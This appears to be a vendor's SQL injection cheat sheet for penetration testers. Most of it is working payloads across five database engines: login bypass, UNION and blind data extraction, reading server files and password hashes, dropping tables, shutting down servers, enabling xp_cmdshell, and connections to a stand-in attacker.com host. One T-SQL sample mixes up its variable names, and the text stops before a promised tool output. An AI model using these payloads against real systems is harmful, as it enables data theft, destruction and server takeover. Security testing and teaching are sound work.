# SQL Injection Cheat Sheet


The cheat sheet includes technical information and payloads for SQL injection attacks against MySQL, Microsoft SQL Server, Oracle and PostgreSQL database servers.

## What is an SQL injection cheat sheet?
This SQL injection cheat sheet is a cybersecurity resource with detailed technical information and attack payloads to test for different types of SQL injection (SQLi) vulnerabilities caused by insufficient user input validation and sanitization. It can be used as a reference for penetration testers but also as a general guide for anyone interested in web application security and all the unexpected things you can do with SQL commands.

## About the Invicti SQL injection cheat sheet
This cheat sheet has been the web’s leading reference for SQL injection payloads ever since it was first published in 2015. It is a living document in constant development and currently contains payloads and tips for MySQL, Microsoft SQL Server, Oracle, PostgreSQL, and SQLite. While originally focused on web form inputs, the payloads and techniques here apply equally to any injection point that reaches a SQL database — including REST API parameters, JSON request bodies, GraphQL variables, and HTTP headers.

As with any cheat sheet, some examples might not work in every situation because injection in real live environments will vary depending on the server configuration, structured query language dialect, usage of parentheses, application framework, and unexpected, strange, and complex SQL statements.

Successful SQL injection often requires a payload tailored to a specific SQL database system. Payload usability is indicated as follows:

- **M** = works on MySQL
- **S** = works on SQL Server
- **P** = works on PostgreSQL
- **O** = works on Oracle
- **L** = works on SQLite
- **+** = works on potentially other databases

When a payloads works on several database systems, you will see multiple symbols:

- **(MS)** = works on MySQL and SQL Server
- **(PO+)** = works on PostgreSQL, Oracle, and possibly other databases

### Automate SQLi testing that you can’t cover manually
No manual testing process can realistically cover every combination of payload, encoding, filter bypass, and injection context, especially across modern attack surfaces like APIs and GraphQL endpoints. DAST tools exist precisely to close that gap.

Invicti’s proof-based scanning doesn’t just detect SQL injection but also safely exploits confirmed vulnerabilities and presents exfiltrated data as a proof of exploit, so you spend time fixing real issues rather than chasing false positives. It covers in-band, out-of-band, and boolean-based blind injection across web applications and APIs.

Learn how proof-based scanning works and request a demo to see it in action.

---

## Table of contents
1.  SQL injection 101: Injecting comments to manipulate queries
2.  Line comments
3.  Inline comments
4.  Classic inline comment SQL injection attack samples
5.  MySQL version detection sample attacks
6.  Stacking queries
7.  Stacked SQL injection attack samples
8.  If statements
    - MySQL If statement
    - SQL Server If statement
    - Oracle If statement
    - PostgreSQL If statement
    - SQLite If statement
9.  If statement SQL injection attack samples
10. Using integers
11. String operations
    - String concatenation
    - Strings without quotes
    - String from a hex representation
    - Using string functions
12. Hex-based SQL injection example
13. String utility functions
14. Union injections
15. Dealing with language issues in UNION injections
16. Bypassing login screens
17. Bypassing login screens that use hashed passwords
    - Example of bypassing an MD5 hash check
18. Error-based ways to discover column information
    - Finding column names using HAVING and GROUP BY (error-based)
    - Finding the number of columns in a SELECT query using ORDER BY
19. Tips and tricks for error-based UNION injections
20. Ways of finding the column type
21. Simple INSERT payload
22. Database version discovery
23. Bulk insert from a file
24. SQL Server utilities
    - The bcp (Bulk Copy Program) utility
    - Using VBS and WSH scripting
25. SQL Server stored procedures
    - Executing system commands using xp_cmdshell
    - Enabling xp_cmdshell in SQL Server
    - Performing registry operations in SQL Server
    - Other useful stored procedures for SQL Server
26. Useful system views in SQL Server
27. Handy techniques for further MSSQL exploitation
    - SQL injection into LIMIT or ORDER
    - Shut down SQL Server
28. Finding and manipulating the database structure in SQL Server
    - Getting user-defined tables
    - Getting column names
    - Moving records
29. Error-based SQL injections in SQL Server: A fast way to extract data
30. Finding the database structure in MySQL
    - Getting user-defined tables
    - Getting column names
31. Blind SQL injections
    - Real-life example of an automatable blind SQL injection attack
32. Ways of making databases wait or sleep for blind SQL injection attacks
    - WAITFOR DELAY
    - BENCHMARK()
    - pg_sleep()
    - sleep()
    - dbms_pipe.receive_message()
33. How SQL injection attacks can be hidden from logs
    - SQL Server log bypass using sp_password
34. Tests to check if SQL injection is possible
35. Tips and tricks for working with MySQL
    - Useful MySQL functions
36. Second-order SQL injections
37. Forcing SQL Server to get NTLM hashes
    - Bulk insert from a UNC share
38. Out-of-band channel attacks
    - Out-of-band injections for SQL Server
    - Out-of-band injections for MySQL on Windows
    - Out-of-band injections for Oracle
39. SQL injection vulnerability classifications and severities

---

## SQL injection 101: Injecting comments to manipulate queries

### Line comments
Put a line comment at the end to comment out the rest of the query. Line comments are typically used to ignore the rest of the original query so you don’t need to worry about ensuring valid syntax after the injection point.

**Payloads & Examples:**

| Payload | Database | Example URL/Parameter | Explanation |
| :--- | :--- | :--- | :--- |
| `--` | (SMPOL) | `http://example.com/login.php?user=admin'--` | The double dash comments out everything that follows. In the example, the original `AND password = '...'` part of the query is ignored. |
| `#` | (M) | `http://example.com/user.php?id=1'#` | The hash symbol is the line comment character for MySQL. It's functionally equivalent to `-- ` for MySQL. |

**A common example is logging in as admin:**
Injection into the `username` parameter with a single quote: `admin'--`
```sql
SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
```
If successful, this will log you as the admin user because the rest of the SQL query after `--` will be ignored.

### Inline comments
You can use inline comments to comment out the rest of a query as with line comments (by simply not closing the comment). They are also useful for manipulating characters to bypass filtering/blacklisting, remove spaces, and obfuscate queries. In MySQL, you can use its special comment syntax to detect the database and version.

**Generic SQL comment syntax is:**
```sql
/*Comment Here*/ (SMPOL)
```
**Typical uses of inline comments:**

| Technique | Example Payload | Purpose |
| :--- | :--- | :--- |
| **Obfuscation** | `DROP/*comment*/sampletable` | Hides the full keyword `DROP` from simple keyword detection filters. |
| **Bypassing Blacklists** | `DR/**/OP/*bypass blacklisting*/sampletable` | Breaks the keyword `DROP` into tokens, bypassing filters that look for the exact string. |
| **Removing Spaces** | `SELECT/*avoid-spaces*/password/**/FROM/**/Members` | Replaces space characters, which can be useful if spaces are filtered or blocked. |

**For MySQL only, you can use special comment syntax:**
```sql
/*! MYSQL special comment format */ (M) 
```
This special comment syntax is perfect for detecting that MySQL is being used because any instructions you put in this comment will only execute in MySQL. You can even use this to detect the version.

### Classic inline comment SQL injection attack samples

| Example Payload | Context/URL Parameter | Explanation |
| :--- | :--- | :--- |
| `ID value: 10; DROP TABLE members /*` | `http://site.com/page.php?id=10; DROP TABLE members /*` | Simply get rid of other stuff at the end the of query. Same as `10; DROP TABLE members --` |
| `SELECT /*!80027 1/0, */ 1 FROM tablename` | `http://site.com/page.php?id=1 UNION SELECT /*!80027 1/0, */ 1,2,3` | Will throw a division by 0 error if MySQL version is higher than 8.0.27. This is a targeted version check. |

### MySQL version detection sample attacks

| ID Value | Example Parameter | Expected Result |
| :--- | :--- | :--- |
| `/*!80027 10*/` | `http://site.com/product.php?id=/*!80027 10*/` | If MySQL version is ≥ 8.0.27, the DB interprets the value as `10`. Otherwise, it sees an empty string. |
| `10` | `http://site.com/product.php?id=10` | You will get the same response for `id=10` if MySQL version is higher than 8.0.27, confirming the version-specific behavior. |
| `SELECT /*!80027 1/0, */ 1 FROM tablename` | `http://site.com/product.php?id=-1 UNION SELECT /*!80027 1/0, */ 1,2,3` | Will throw a division by 0 error if MySQL version is higher than 8.0.27. |

## Stacking queries
Stacking means executing more than one query in one transaction. This technique can be very useful but only works for some combinations of database server and access method.

**Payload:** `;` (MSP)
```sql
SELECT * FROM members; DROP members--
```
When successful, this will end one query and start another one.

**Crucial Note:** Results from the second query (and any additional queries) are not returned to the application. You need to use blind SQL injection methods to confirm that the second query is working, such as a delay, DNS query, etc.

### Stacked SQL injection attack samples

| ID Value Payload | Example Parameter | Explanation |
| :--- | :--- | :--- |
| `10;DROP members --` | `http://site.com/product.php?id=10;DROP members --` | This will run `DROP members` SQL sentence after normal SQL Query. |
| `10; UPDATE members SET password='pwned' WHERE login='admin'--` | `http://site.com/user.php?id=10; UPDATE members SET password='pwned' WHERE login='admin'--` | A more complex stacked query that modifies data after the legitimate query. |
| `10; EXEC xp_cmdshell('nslookup example.com')--` | `http://site.com/item.php?id=10; EXEC xp_cmdshell('nslookup example.com')--` | Stacking with a command execution attempt (MSSQL specific). |

## If statements
Get response based on an IF statement. This is one of the key techniques for Blind SQL Injection. Also very useful to test simpler things blindly yet accurately.

### MySQL If statement
```sql
IF(condition,true-part,false-part) (M)
```
**Example:**
```sql
SELECT IF(1=1,'true','false')
```
**Injected Example:** `http://site.com/page.php?id=1 AND IF(1=1, SLEEP(10), 0)`
This will cause a 10-second delay if the condition `1=1` is true.

### SQL Server If statement
```sql
IF condition true-part ELSE false-part (S)
```
**Example:**
```sql
IF (1=1) SELECT 'true' ELSE SELECT 'false'
```
**Injected Example:** `http://site.com/page.php?id=1; IF (SYSTEM_USER = 'sa') WAITFOR DELAY '00:00:10'--`
If the current user is 'sa', a 10-second delay is introduced.

### Oracle If statement
```sql
BEGIN
IF condition THEN true-part; ELSE false-part; END IF; END; (O)
```
**Example:**
```sql
IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END;
```
**Injected Example:** `http://site.com/page.php?id=1; BEGIN IF (1=1) THEN dbms_lock.sleep(10); END IF; END;--`

### PostgreSQL If statement
```sql
SELECT CASE WHEN condition THEN true-part ELSE false-part END; (P)
```
**Example:**
```sql
SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END;
```
**Injected Example:** `http://site.com/page.php?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;--`

### SQLite If statement
```sql
iif(condition, true-part, false-part) (L)
```
**Example:**
```sql
SELECT iif(1<2, "True", "False");
```
**Injected Example:** `http://site.com/page.php?id=1 AND iif(1=1, 1, 0)`

### If statement SQL injection attack samples

| Example Payload | Example URL Parameter | Explanation |
| :--- | :--- | :--- |
| `if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0` (S) | `http://site.com/item.php?id=1; if (system_user = 'sa') select 1 else select 1/0--` | This will throw a divide by zero error if the user currently logged in is not 'sa' or 'dbo'. |
| `IF(1=1, BENCHMARK(5000000, MD5('a')), 0)` (M) | `http://site.com/product.php?id=1 AND IF(1=1, BENCHMARK(5000000, MD5('a')), 0)` | If the condition is true, the server will be noticeably slow due to the intense benchmark function. |

## Using integers
Very useful for bypassing `magic_quotes()` and similar filtering/escaping techniques, including web application firewall (WAF) filters.

**Payload:** `0xHEXNUMBER` (SM)
You can use hex values in queries like this:

| Example | Database | Explanation |
| :--- | :--- | :--- |
| `SELECT CHAR(0x66)` | (S) | Returns the character 'f' based on its hex value. |
| `SELECT 0x5045` | (M) | This is not an integer but a string based on the hex representation. |
| `SELECT 0x50 + 0x45` | (M) | This becomes an integer! The hex values are treated as numbers. |

**Injection Bypass Example:**
`http://site.com/login.php?user=admin&pass=' OR 0x20 + 0x10 = 0x30 -- -`
The comparison `0x20 + 0x10 = 0x30` translates to `32 + 16 = 48`, which is true. This bypasses the need for quotes around strings.

## String operations
String-related operations can be useful for building up injections that do not use any quotes, bypassing blacklisting, or determining the type of back-end database.

### String concatenation

| Operator/Function | Database | Example |
| :--- | :--- | :--- |
| `+` | (S) | `SELECT login + '-' + password FROM members` |
| `\|\|` | (*MO) | `SELECT login \|\| '-' \|\| password FROM members` |
| `CONCAT()` | (M) | `SELECT CONCAT(login, password) FROM members` |

**Injected Example (SQL Server):** `http://site.com/report.php?user=admin' + '-' + (SELECT TOP 1 password FROM users)--`
**Injected Example (MySQL in ANSI mode or Oracle/PostgreSQL):** `http://site.com/report.php?user=admin' \|\| '-' \|\| (SELECT password FROM users LIMIT 1)--`

### Strings without quotes
Apart from a few direct ways of specifying strings, you can always use `CHAR()`(MS) and `CONCAT()`(M) to generate a string without quotes.

**Example:** Injecting the string `'admin'` without quotes.
- **SQL Server:** `CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)`
- **MySQL:** `CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))`

### String from a hex representation
**Payload:** `0x457578` (M): Return a string based on the hex representation.
**Example:** `SELECT 0x457578` will be selected as a string 'Eux' in MySQL.
**Quick Tip:** `SELECT CONCAT('0x',HEX('c:\\boot.ini'))` generates the hex string for a file path.

### Using string functions
All these examples return the string `KLM`:

| Database | Payload | Explanation |
| :--- | :--- | :--- |
| MySQL (M) | `SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))` | Concatenates three characters generated from ASCII codes. |
| SQL Server (S) | `SELECT CHAR(75)+CHAR(76)+CHAR(77)` | Uses the `+` operator for concatenation. |
| Oracle (O) | `SELECT CHR(75)\|\|CHR(76)\|\|CHR(77)` | Uses `CHR()` and `\|\|` operator. |
| PostgreSQL (P) | `SELECT (CHaR(75)\|\|CHaR(76)\|\|CHaR(77))` | Function names are case-insensitive; uses `\|\|` operator. |

## Hex-based SQL injection example
```sql
SELECT LOAD_FILE(0x633A5C626F6F742E696E69) (M)
```
This will show the content of `c:\boot.ini`. The hex string `0x633A5C626F6F742E696E69` is the representation of `'c:\boot.ini'`.

**Injected Example:** `http://site.com/page.php?id=1 UNION SELECT LOAD_FILE(0x2F6574632F706173737764),2,3` would attempt to read `/etc/passwd`.

## String utility functions

| Function | Database(s) | Description |
| :--- | :--- | :--- |
| `ASCII()` | (SMPO) | Returns the ASCII character value of the leftmost character. Essential for blind SQL injections. |
| `CHAR()` | (SM) | Returns a character based on its ASCII value. |
| `CHR()` | (P) | Returns a character based on its ASCII value. |

**Examples for Blind Injection:**

- **MySQL/PG:** `SELECT ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))`
- **SQL Server:** `SELECT ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))`
- **Injected Example:** `http://site.com/user.php?id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 80`

## UNION-based injections
With the `UNION` statement, you can run cross-table SQL queries. By injecting `UNION`, you can poison a query to return records from another table.

```sql
SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members
```
This query will combine results from the `news` and `members` tables and return all of them.

**Sample Payloads:**

| Payload | Example URL Parameter | Explanation |
| :--- | :--- | :--- |
| `' UNION SELECT 1, 'anotheruser', 'any string', 1--` | `http://site.com/login.php?user=' UNION SELECT 1, 'anotheruser', 'any string', 1--` | A classic UNION injection that returns attacker-controlled data alongside legitimate results. |
| `-1' UNION SELECT 1,2,3--` | `http://site.com/product.php?id=-1' UNION SELECT 1,2,3--` | Using `-1` (or a non-existent ID) ensures the original query returns no results, leaving only your injected data visible. |

### Dealing with language issues in UNION injections
While exploiting UNION injections, you can sometimes get errors because of different language settings. Here are a few tricks to deal with it:

| Database | Solution |
| :--- | :--- |
| **SQL Server (S)** | Use `COLLATE SQL_Latin1_General_Cp1254_CS_AS` (or another collation method). <br>**Example:** `SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members` |
| **MySQL (M)** | Use `Hex()` to deal with any encoding issues. <br>**Example:** `SELECT name FROM members UNION SELECT HEX(non_unicode_column) FROM international_table` |

## Bypassing login screens (SMO+)
SQL injection 101: here are some typical login tricks that you can use with form fields and parameters.

### Authentication Bypass Payloads Table

| Payload | Example in Login Form (`user` field) | How it Works |
| :--- | :--- | :--- |
| `admin' --` | `Username: admin' --` | Logs in as 'admin' by commenting out the password check. |
| `admin' #` | `Username: admin' #` | MySQL version of the above. |
| `admin'/*` | `Username: admin'/*` | Uses an inline comment to ignore the rest of the query. |
| `' or 1=1--` | `Username: ' or 1=1--` | The `OR 1=1` condition makes the `WHERE` clause always true, returning the first user. |
| `' or 1=1#` | `Username: ' or 1=1#` | MySQL version of the above. |
| `' or 1=1/*` | `Username: ' or 1=1/*` | Inline comment version of the above. |
| `') or '1'='1--` | `Username: ') or '1'='1--` | Bypasses queries that wrap parameters in parentheses, e.g., `WHERE (username='...' AND password='...')`. |
| `') or ('1'='1--` | `Username: ') or ('1'='1--` | Fixes the syntax by opening a new parenthesis that isn't closed, relying on the original query's closing parenthesis. |
| `' UNION SELECT 1, 'anotheruser', 'any string', 1--` | `Username: ' UNION SELECT 1, 'anotheruser', 'any string', 1--` | Logs in as a different user by injecting a fabricated record via UNION. |

### Bypassing login screens that use hashed passwords
If the application hashes the password, you can't just supply a plain-text password in your `UNION SELECT`. You must supply a pre-computed hash of a password you know.

**Example of bypassing an MD5 hash check (MSP)**
Assume the login query is: `SELECT * FROM users WHERE username='input_user' AND password=MD5('input_pass')`
You can bypass it by injecting a known user and its pre-calculated password hash.

| Field | Value |
| :--- | :--- |
| **Username** | `admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'` |
| **Password** | `1234` |

`81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)`

This works because the application will compare the MD5 hash of your supplied password ('1234') with the hash you injected via UNION, which are the same.

## Error-based ways to discover column information

### Finding column names using HAVING and GROUP BY (error-based) (S)
This technique forces the database to reveal column names by throwing specific error messages. It leverages the `HAVING` and `GROUP BY` clauses.

**Try the following payloads in the specified order:**

| Order | Payload | Resulting Error Message (Example) | Information Gained |
| :--- | :--- | :--- | :--- |
| 1 | `' HAVING 1=1 --` | `Column 'users.username' is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.` | The error reveals the first column name (`users.username`). |
| 2 | `' GROUP BY table.columnfromerror1 HAVING 1=1 --` | `Column 'users.password' is invalid in the select list...` | Error now reveals the second column name. |
| 3 | `' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --` | Another column name, e.g., `users.email` is revealed. | Error reveals the third column. |
| ... | ... and so on ... | | |
| N | `' GROUP BY table.columnfromerror1, columnfromerror2, ..., columnfromerror(n) HAVING 1=1 --` | No error. | Once you are not getting any more errors, you are done. You have discovered all columns in the query. |

### Finding the number of columns in a SELECT query using ORDER BY (MSO+)
Finding the number of columns using `ORDER BY` can speed up the `UNION` SQL injection process.

**Try the following payloads, incrementing the number each time:**

| Payload | Example URL | Expected Outcome |
| :--- | :--- | :--- |
| `ORDER BY 1--` | `http://site.com/list.php?id=1 ORDER BY 1--` | No error. This tells us the query returns at least 1 column. |
| `ORDER BY 2--` | `http://site.com/list.php?id=1 ORDER BY 2--` | No error. The query has 2 or more columns. |
| ... | ... | Keep going. |
| `ORDER BY N--` | `http://site.com/list.php?id=1 ORDER BY N--` | Error! (e.g., `The ORDER BY position number N is out of range...`). |
The number of columns is `N-1`. If you get an error on `ORDER BY 5`, there are 4 columns.

**Tips and tricks for error-based UNION injections**
- Always use `UNION` with `ALL` because you can have similar non-distinct field types. By default, `UNION` tries to get distinct records.
- To get rid of unwanted records from the left-side table in a join, you can use `-1` or any non-existent record search at the beginning of your query. This is necessary if you are only getting one result at a time and want to ensure your injected data is the one displayed.
- For most data types, you can use `NULL` in `UNION` injections instead of trying to guess if the column is a string, date, integer, etc.
- In blind injection situations, make sure you always check if the error is coming from the database or from the application itself. Some languages (like ASP.NET) tend to generally throw errors when dealing with `NULL` values.

### Ways of finding the column type
Use the `sum()` function to provoke errors from non-numeric types:

```sql
' UNION SELECT sum(columntofind) from users-- (S)
```
**Error Example:** `Microsoft OLE DB Provider for ODBC Drivers error '80040e07' [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a varchar data type as an argument.`
If you are **not** getting an error, it means the column is numeric.

**Step-by-Step Column Mapping with `cast()`/`convert()` and `UNION`:**

This technique finds the data type of each column by trying to cast a string to an incompatible type and analyzing the errors.

| Step | Payload (Injected into `id` parameter) | Result | Analysis |
| :--- | :--- | :--- | :--- |
| 1 | `11223344) UNION SELECT NULL,NULL,NULL,NULL--` | No error. | Syntax is correct. We have at least 4 columns. |
| 2 | `11223344) UNION SELECT 1,NULL,NULL,NULL--` | No error. | First column is an integer. |
| 3 | `11223344) UNION SELECT 1,2,NULL,NULL--` | Error! `Explicit conversion from data type int to image is not allowed.` | Second column is NOT an integer. It might be an image or other type. |
| 4 | `11223344) UNION SELECT 1,'2',NULL,NULL--` | No error. | Second column is a string type. |
| 5 | `11223344) UNION SELECT 1,'2',3,NULL--` | Error! | Third column is NOT an integer. |
| 6 | `... and so on ...` | ... | Rinse and repeat until you have all the column types mapped out. |

You will get `convert()` errors before `UNION` target errors, so remember to start with `convert()` and only then do `UNION`.

## Simple INSERT payload
While SELECT statements are normally preferred for testing as non-destructive, an INSERT injection into a user table can allow you to add a new user, hopefully with elevated permissions:
```sql
'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/* (MSO+)
```
**Example:** Injecting into a registration form's username field:
`Username: hax0r'; insert into users values( 99, 'evil', 'password', 1 )/*`
This adds a new admin user (assuming `id=99` is free and `1` is the admin privilege level) after the legitimate user creation query.

## Database version discovery
Knowing the exact database version is crucial for targeting specific exploits or features.

| Database | Query Payload | Injected Example |
| :--- | :--- | :--- |
| **SQL Server** | `@@version` | `http://site.com/item.php?id=1 UNION SELECT @@version,2--` |
| **PostgreSQL** | `version()` | `http://site.com/item.php?id=1 UNION SELECT NULL, version(), NULL--` |
| **SQLite** | `sqlite_version()` | `http://site.com/item.php?id=1 UNION SELECT NULL,sqlite_version(),NULL;--` |
| **Oracle** | `PRODUCT_COMPONENT_VERSION` | `http://site.com/item.php?id=1 UNION SELECT version FROM PRODUCT_COMPONENT_VERSION WHERE product LIKE 'Oracle Database%'--` |

## Bulk insert from a file (S)
Inserting the content of a file into a table lets you browse local files when you only have database access.

```sql
CREATE TABLE foo( line varchar(8000) )
BULK INSERT foo FROM 'c:\inetpub\wwwroot\login.asp'
```
You can then `SELECT * FROM foo` to read the file content, and finally drop the temp table.

**IIS Tip:** If you don't know the web root, try reading `%systemroot%\system32\inetsrv\MetaBase.xml` and parsing it for the application path.

## SQL Server utilities

### The bcp (Bulk Copy Program) utility (S)
`bcp` is a command-line tool to bulk copy data between an instance of Microsoft SQL Server and a data file.
```cmd
bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar
```
**Note:** This requires login credentials (`-U` and `-P`), typically extracted via SQLi.

### Using VBS and WSH scripting (S)
ActiveX support in SQL Server lets you use Visual Basic Script (VBS) and Windows Script Host (WSH) scripting.

**Example Shell Script Injection:**
```sql
'; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --
```
This payload creates a WScript Shell object and runs `notepad.exe` on the server.

## SQL Server stored procedures

### Executing system commands using xp_cmdshell (S)
This is a well-known trick for command injection, but it has two crucial requirements:
1.  It’s disabled by default in SQL Server 2005+, so you need to enable it first.
2.  You need to have admin access (`sysadmin` role) to enable it.

**Payloads to execute commands:**

| Example Payload | Purpose |
| :--- | :--- |
| `EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'` | Executes `dir c:` on the server's command prompt. |
| `EXEC master.dbo.xp_cmdshell 'ping example.com'` | Simple check to see if you can execute commands. You'd need a network listener to see the ping. |

**Injected Example:** `http://site.com/item.php?id=1; EXEC master.dbo.xp_cmdshell 'nslookup attacker.com'--`

### Enabling xp_cmdshell in SQL Server (S)
Once you have admin access, you can enable `xp_cmdshell` as follows:
```sql
EXEC sp_configure 'show advanced options',1 
RECONFIGURE

EXEC sp_configure 'xp_cmdshell',1 
RECONFIGURE
```
**Stacked Query Injection Example:** `http://site.com/item.php?id=1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--`

### Performing registry operations in SQL Server (S)
Stored procedures are available to perform various registry operations. Some of these are undocumented.

**Key Registry Procedures:**
`xp_regaddmultistring`, `xp_regdeletekey`, `xp_regdeletevalue`, `xp_regenumkeys`, `xp_regenumvalues`, `xp_regread`, `xp_regremovemultistring`, `xp_regwrite`

**Sample Payloads:**

| Payload | Purpose |
| :--- | :--- |
| `exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'` | Reads the value of `nullsessionshares`. |
| `exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'` | Enumerates and reads SNMP community strings. |

### Other useful stored procedures for SQL Server (S)

| Procedure | Purpose | Example of Usage in a Payload |
| :--- | :--- | :--- |
| `xp_servicecontrol` | Managing services (start, stop). | `'; exec xp_servicecontrol 'stop', 'SNMP'--` |
| `xp_availablemedia` | Listing storage media. | `'; exec xp_availablemedia--` |
| `xp_enumdsn` | Listing ODBC resources. | `'; exec xp_enumdsn--` |
| `xp_loginconfig` | Managing the login mode. | `'; exec xp_loginconfig--` |
| `xp_makecab` | Creating CAB files. | `'; exec xp_makecab 'c:\temp\file.txt', 'c:\temp\file.cab'--` |
| `xp_ntsec_enumdomains` | Listing domains. | `'; exec xp_ntsec_enumdomains--` |
| `xp_terminate_process` | Process termination (needs PID). | `'; exec xp_terminate_process 1234--` |
| `sp_makewebtask` | Writing an HTML file to a UNC or internal path. | `'; exec sp_makewebtask '\\10.0.0.1\share\output.html', 'SELECT * FROM users'--` |
| `sp_addextendedproc` | Adds a new procedure, allowing arbitrary code execution via DLLs. | `'; sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll'; exec xp_webserver--` |

## Useful system views in SQL Server (S)

| View/Table | Information Contained | Example Query |
| :--- | :--- | :--- |
| `master..sysmessages` | Error messages. | `SELECT * FROM master..sysmessages` |
| `master..sysservers` | Linked servers. | `SELECT * FROM master..sysservers` |
| **SQL Server 2000:** `masters..sysxlogins` | Logins and password hashes. | `SELECT name, password FROM master.dbo.sysxlogins` |
| **SQL Server 2005+:** `sys.sql_logins` | Logins and password hashes. | `SELECT name, password_hash FROM sys.sql_logins` |

## Handy techniques for further MSSQL exploitation

| Technique | Example Payload/Query | Explanation |
| :--- | :--- | :--- |
| **Get Process Info** | `SELECT * FROM master..sysprocesses` | See detailed information about running processes, including the current SPID. |
| **Check Command Success** | `DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0` | Forces a divide-by-zero error if the `dir` command fails, giving you boolean feedback. |
| **Get Host Name** | `SELECT HOST_NAME()` | Returns the hostname of the database server. |
| **Check Group Membership** | `SELECT IS_MEMBER('domain\group')` | Checks if the current user is a member of a specific Windows group. |
| **Check Server Role** | `SELECT IS_SRVROLEMEMBER('sysadmin')` | Checks if the user has a specific SQL Server server-level role. |
| **Open Remote Connection** | `SELECT * FROM OPENDATASOURCE('SQLOLEDB', 'Data Source=attacker.com;User ID=sa;Password=pass').database.owner.table` | Opens a remote connection to an attacker-controlled SQL Server. |
| **OPENROWSET** | `SELECT * FROM OPENROWSET('SQLNCLI', 'Server=attacker.com;Trusted_Connection=yes;', 'SELECT 1')` | Another method for creating ad-hoc connections. |

### SQL injection into LIMIT (M) or ORDER (MSO)
**Vulnerable Query Example:** `SELECT id, product FROM test.test t LIMIT 0,10;`
**Injection Payload:** `0,0 UNION ALL SELECT 1,'x'/*,10 ;`
**Result:** `SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;`

### Shut down SQL Server (S)
To shut down the database server, inject: `';shutdown --`

## Finding and manipulating the database structure in SQL Server (S)

### Getting user-defined tables (S)
**Old Method (SQL Server 2000):** `SELECT name FROM sysobjects WHERE xtype = 'U'`
**New Method (SQL Server 2005+):** `SELECT TOP 1 name FROM sys.objects WHERE type = 'U'`

### Getting column names (S)
**Old Method:** `SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')`
**New Method:** `SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('tablename')`

### Moving records (S)
**Using NOT IN or NOT EXIST:**
```sql
... WHERE users NOT IN ('First User', 'Second User')
SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)
```

**Dirty Tricks for Column Enumeration in a Single Injection:**
```sql
SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (
   SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3)
   as int
```
This complex query uses sub-queries and `CAST` to potentially reveal table names by forcing a type conversion error.

## Error-based SQL injections in SQL Server: A fast way to extract data (S)
Here’s a sample payload that combines variables and system table queries to extract data into a temporary table.

**For older MSSQL versions:**
```sql
';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE 
   id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') 
   AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--
```

**For newer MSSQL versions:**
```sql
';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM sys.columns WHERE 
   object_id = OBJECT_ID('MEMBERS') 
   AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--
```
This creates a temporary table `TMP_SYS_TMP` and fills it with the concatenated column names from the `MEMBERS` table, which you can then extract via `UNION SELECT`.

## Finding the database structure in MySQL (M)

### Getting user-defined tables (M)
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'
```
You can find the current database name using the `DATABASE()` function.

### Getting column names (M)
```sql
SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'
```

### Finding the database structure in Oracle (O)

#### Getting user-defined tables (O)
```sql
SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'
```

#### Getting column names (O)
```sql
SELECT * FROM all_col_comments WHERE TABLE_NAME = 'TABLE'
```

## Blind SQL injections
In any decent production application, you generally cannot see any error responses on the page. This rules out extracting data directly through error-based attacks. In these cases, you have to use blind SQL injections to extract the data.

**Types of Blind SQLi:**
1.  **Normal blind injections:** You cannot see the response directly on the page, but you can still determine the result of a query based on a response or HTTP status code.
2.  **Totally blind injections:** You cannot see the effects of your injection in any kind of output. This is less common. You must use time-based methods.

### Real-life example of an automatable blind SQL injection attack
This output is from a real private blind SQL injection tool exploiting a SQL Server back-end. It uses a binary search algorithm to determine the first character of the first table name by asking a series of TRUE/FALSE questions.

